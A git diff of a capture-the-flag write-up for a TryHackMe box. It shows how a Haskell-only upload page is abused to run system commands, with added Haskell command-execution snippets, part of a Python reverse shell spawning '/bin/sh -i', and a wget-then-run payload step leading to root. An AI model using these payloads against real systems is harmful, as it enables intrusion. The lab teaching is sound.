@@ -24,13 +24,14 @@ The first homework assignment contains a few problems, and provides a link to wh
 Unfortunately, the professor included the wrong link and we get a 404.
 ![Upload page](https://passthehashbrowns.github.io/images/upload_page.png)
 
-With a little more enumeration, we find that there's a Submit page. Looks like the professor just got his wires crossed.
+With a little more enumeration, we find that there's a Submit page. Looks like the professor just got his wires crossed. The tool used here [is FFUF](https://github.com/ffuf/ffuf), my preferred tool for web fuzzing.
 ![Dirb scan](https://passthehashbrowns.github.io/images/dirb_scan.png)
 
 Once we navigate to the Submit page, we find a pretty basic file upload functionality.
 ![Submit page](https://passthehashbrowns.github.io/images/submit_page.png)
 
 On a previous page, the professor noted that only Haskell files would be accepted for upload, because of a lesson learned previously. We can try uploading other types of files, but they won't be accepted. We have a few routes that we can take from here. The immediate thought that comes to mind is to try and use Haskell to interact with system processes. I've written a short piece of code to do just that.
+![Haskell base code](https://passthehashbrowns.github.io/images/haskell_base_cmd.png)
 
 The Python payload that I used is just the PentestMonkey Python one-liner expanded because of my own neurosis.
 
@@ -44,12 +45,29 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ~~~
 
-NOTE: I've had some users saying that the box is broken because they get an internal server error if there's an integer or special character in the file name. The box isn't broken, this was done on purpose because I didn't want to introduce an OS Command Injection into the machine and I decided to blacklist all non alpha characters except for the dot in the file extensionsince that's exactly how a lazy professor would do it. Totally not cause I'm lazy. You can see the code that causes this here:
-![Server error code](https://passthehashbrowns.github.io/images/server_error.png)
+NOTE: I've had some users saying that the box is broken because they get an internal server error if there's an integer or special character in the file name. The box isn't broken, this was done on purpose because I didn't want to introduce an OS Command Injection into the machine and I decided to blacklist all non alpha characters except for the dot in the file extension since that's exactly how a lazy professor would do it. Totally not cause I'm lazy. You can see the code that causes this here:
+![Server error code](https://passthehashbrowns.github.io/images/server_error_code.png)
 
-Some TryHackMe users were more clever than me and were able to implement this in less lines and handle redirection. The reason the screenshot above uses wget to grab a Python file is that when you try to use createProcess with your standard BASH reverse shell, you get some weird issues with redirection. The solution to this was to use the callCommand function from the System.Process library. My solution was to wget a Python payload and then run it with another file upload. Since this is a Flask web server, we know that Python will be available to the web user.
+Some TryHackMe users were more clever than me implemented this more concisely. The reason that my solution uses wget to grab a Python file is that when you try to use createProcess with your standard BASH reverse shell, you get some weird issues with redirection. The most common solution that I've seen is to use the callCommand function from the System.Process library, which takes the command string as an argument. Here are the two for comparison:
+1.
+~~~haskell
+import System.Process
+import System.IO
+main = do 
+    (_, Just hout, _, _) <- createProcess (proc "ls" ["-la"]){ std_out = CreatePipe }
+    cmdOut <- hGetContents hout
+    putStrLn cmdOut
+~~~
+2.
+~~~haskell
+import System.Process
+main = do
+  callCommand "ls -la"
+~~~
 
-However, I felt sort of weird that there was no existing reverse shell implementation in Haskell, so I went ahead and wrote my own. [You can find it here.](https://github.com/passthehashbrowns/Haskell-Reverse-Shell) Ironically, it doesn't work on this web server because of how the command is being run, but it does serve as a POC.
+I use "ls -la" as an atomic example. While my solution does correctly handle IO, I think that their solution is far better in this case.
+
+Still, I felt sort of weird that there was no existing reverse shell implementation in Haskell, so I went ahead and wrote my own. [You can find it here.](https://github.com/passthehashbrowns/Haskell-Reverse-Shell) Ironically, it doesn't work on this web server because of how the command is being run, but it does serve as a POC.
 
 Anyways, using the Python payload, we can wget it and then run it.
 ![Python wget](https://passthehashbrowns.github.io/images/python_wget.png)
@@ -68,6 +86,6 @@ Using Flask we can use the exact same Python payload as before and catch our roo
 ![Flask run](https://passthehashbrowns.github.io/images/flask_run.png)
 ![Catch root shell](https://passthehashbrowns.github.io/images/catch_root_shell.png)
 
-Hopefully you enjoyed this box, I learned a few things making it and plan on making more in the future.
+Hopefully you enjoyed this box, I had a great time making it and plan on making more in the future. 
 
 
